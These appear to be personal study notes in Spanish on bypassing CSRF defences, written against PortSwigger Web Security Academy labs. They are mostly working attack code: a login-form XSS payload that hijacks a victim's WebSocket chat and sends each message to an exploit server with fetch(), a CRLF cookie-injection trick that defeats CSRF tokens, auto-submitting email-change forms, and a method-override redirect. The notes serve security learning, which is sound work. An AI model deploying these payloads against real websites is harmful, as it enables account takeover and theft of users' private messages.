CSRF

EJEMPLO GENIAL:
https://portswigger.net/web-security/learning-paths/csrf/csrf-bypassing-samesite-restrictions-via-vulnerable-sibling-domains/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain#
<script>
document.addEventListener("DOMContentLoaded", () => {

const url = "https://cms-0a1e00ff039eb691801b224100e40079.web-security-academy.net"

const script = `
<audio src=x onerror="
const url = 'wss://0a1e00ff039eb691801b224100e40079.web-security-academy.net/chat';
const attackerServer = 'https://exploit-0a3c00fd0310b6a9806a218c01bb0058.exploit-server.net/logs';
const newWebSocket = new WebSocket(url);

newWebSocket.onopen = function () { 
  newWebSocket.send('READY');
};

newWebSocket.onmessage = function (evt) {
  var message = evt.data;
  fetch(attackerServer + message);
};
">
`

const form = document.createElement("form");
form.method = "POST";
form.action = `${url}/login`;

const input = document.createElement("input");
input.type = "text";
input.name = "username";
input.value = script ;
form.appendChild(input);

const input2 = document.createElement("input");
input2 .type = "text";
input2 .name = "password";
input2 .value = "Test";
form.appendChild(input2);

document.body.appendChild(form);
form.submit();
});
</script>


Herramientas de Burp Suite:
- CSRF PoC generator (requiere Professional)

<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>

<script>
document.addEventListener("DOMContentLoaded", () => {
const randomEmail = Math.random().toString(36).slice(2) + "@example.com";

const url = "https://0a3200210372b1e9862dd99300650083.web-security-academy.net"
const csrfToken= "fake33";

const img = new Image();
img.src = `${url}/?search=test;%0d%0aSet-Cookie:csrf=${csrfToken};SameSite=None`;

const form = document.createElement("form");
form.method = "POST";
form.action = `${url}/my-account/change-email`;

const input = document.createElement("input");
input.type = "text";
input.name = "email";
input.value = randomEmail ;
form.appendChild(input);

const input2 = document.createElement("input");
input2 .type = "text";
input2 .name = "csrf";
input2 .value = csrfToken;
form.appendChild(input2 );

document.body.appendChild(form);
form.submit();
});
</script>



%0d → CR (Carriage Return)
%0a → LF (Line Feed)
%0d%0a → CRLF


<script>
const randomEmail = Math.random().toString(36).slice(2) + "@example.com";

window.location = `
https://0a4300a40483924c801e7bf000df005a.web-security-academy.net/my-account/change-email?email=${randomEmail }&_method=POST`
</script>